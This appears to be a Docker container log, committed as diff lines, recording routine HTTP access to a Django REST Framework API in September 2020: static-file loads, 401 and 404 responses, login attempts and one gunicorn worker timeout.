+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:21 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:22 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:23 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:29 +0000] "POST /api-auth/login/ HTTP/1.1" 302 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:29 +0000] "GET /api/v1/ HTTP/1.1" 200 10980 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /static/rest_framework/css/bootstrap.min.css.map
+[36mweb_1  |[0m 73.11.191.73 - - [19/Sep/2020:23:40:30 +0000] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 2573 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:51 +0000] "GET /api/v1 HTTP/1.1" 301 0 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 66.102.8.166 - - [19/Sep/2020:23:41:52 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.165 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.166 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.165 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.166 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:52 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.166 - - [19/Sep/2020:23:41:53 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m 66.102.8.168 - - [19/Sep/2020:23:41:53 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:05 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:06 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:06 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:06 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:07 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:07 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:07 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:08 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:08 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:10 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:10 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m [2020-09-19 23:52:37 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:7)
+[36mweb_1  |[0m [2020-09-19 23:52:37 +0000] [7] [INFO] Worker exiting (pid: 7)
+[36mweb_1  |[0m [2020-09-19 23:52:37 +0000] [11] [INFO] Booting worker with pid: 11
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:38 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m Not Found: /favicon.ico
+[36mweb_1  |[0m 174.204.68.186 - - [19/Sep/2020:23:52:38 +0000] "GET /favicon.ico HTTP/1.1" 404 2465 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
+[36mweb_1  |[0m Not Found: /
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:19:58 +0000] "GET / HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /favicon.ico
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:19:59 +0000] "GET /favicon.ico HTTP/1.1" 404 2465 "http://206.189.68.96/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Not Found: /api
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:03 +0000] "GET /api HTTP/1.1" 404 2441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:09 +0000] "GET /api/v1 HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m Unauthorized: /api/v1/
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /api/v1/ HTTP/1.1" 401 5133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:10 +0000] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 0 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:11 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:14 +0000] "GET /api-auth/login/?next=/api/v1/ HTTP/1.1" 200 2708 "http://206.189.68.96/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:14 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:14 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:14 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:14 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:15 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:22 +0000] "POST /api-auth/login/ HTTP/1.1" 200 2945 "http://206.189.68.96/api-auth/login/?next=/api/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:22 +0000] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:22 +0000] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:22 +0000] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:22 +0000] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0 "http://206.189.68.96/api-auth/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
+[36mweb_1  |[0m 71.231.224.91 - - [20/Sep/2020:00:20:23 +0000] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0 "http://206.189.68.96/static/rest_framework/css/bootstrap-tweaks.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
